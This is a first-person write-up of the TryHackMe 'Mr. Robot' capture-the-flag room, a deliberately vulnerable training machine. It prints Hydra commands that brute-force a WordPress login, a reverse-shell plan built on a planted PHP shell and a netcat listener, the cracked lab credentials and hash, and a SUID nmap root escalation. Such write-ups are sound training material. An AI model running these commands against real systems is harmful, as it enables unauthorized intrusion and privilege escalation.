# TryHackMe - Mr. Robot Writeup

## Reconnaissance

Initial passive and active reconnaissance involved visiting the target IP in a browser. The landing page appeared to be styled after the _Mr. Robot_ TV series, suggesting potential hidden elements or Easter eggs.

To discover additional directories, I ran `gobuster` against the web server:

```bash
gobuster dir -u http://10.10.178.83 -w /usr/share/wordlists/dirb/common.txt
```

This uncovered a few interesting endpoints, including:

- `/robots.txt`
    
- `/wp-login.php`
    
- `/license.txt`
    

Navigating to `/robots.txt` revealed the following contents:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

The file `key-1-of-3.txt` was accessible and contained the first flag.

---

## Enumeration

### 1. Username Discovery (Brute Forcing with Hydra)

The reference to `fsocity.dic` in `robots.txt` hinted that it might be a wordlist. I used it to brute-force usernames on the WordPress login page.

Since WordPress often gives verbose login errors (e.g., "invalid username" vs. "incorrect password"), I exploited this using Hydra:

```bash
hydra -L fsocity.dic -p test 10.10.178.83 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"
```

This revealed a valid username: `Elliot`.

### 2. Password Brute-Forcing

With a confirmed username, I ran another Hydra command to brute-force the password:

```bash
hydra -l Elliot -P fsocity.dic 10.10.178.83 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"
```

The correct credentials were found:

```
Username: Elliot
Password: ER28-0652
```

---

## Exploitation

### 1. WordPress Admin Access → Remote Code Execution

Logging into the WordPress dashboard with the above credentials, I verified that Elliot had sufficient privileges to edit theme files via:

**Appearance → Theme Editor**

To gain a reverse shell, I replaced the contents of `archive.php` in the active theme (TwentyFifteen) with a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell). Before uploading, I modified the IP and port to point to my attack machine.

On my attacker machine, I started a Netcat listener:

```bash
nc -lnvp 53
```

Then, I triggered the reverse shell by visiting:

```
http://10.10.178.83/wp-content/themes/twentyfifteen/archive.php
```

I received a reverse shell as the `www-data` user.

### 2. Finding Key 2

Within the `/home/robot/` directory, I found a `password.raw-md5` file:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracking the hash using an online tool (or `hashcat`):

```
MD5 Hash: c3fcd3d76192e4007dfb496cca67e13b
Plaintext: abcdefghijklmnopqrstuvwxyz
```

This gave me the password for the `robot` user. I upgraded my shell for interactivity:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then used `su` to switch to `robot`:

```bash
su robot
```

After providing the cracked password, I successfully switched users and retrieved `key-2-of-3.txt`.

---

## Privilege Escalation

To escalate to root, I checked for binaries with the SUID bit set:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results, I found an interesting binary: `nmap`.

Referencing [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#shell), I used `nmap`'s interactive mode to spawn a root shell:

```bash
nmap --interactive
```

Within the Nmap shell:

```bash
!sh
```

This escalated me to a root shell. From there, I navigated to `/root/` and found the final flag: `key-3-of-3.txt`.
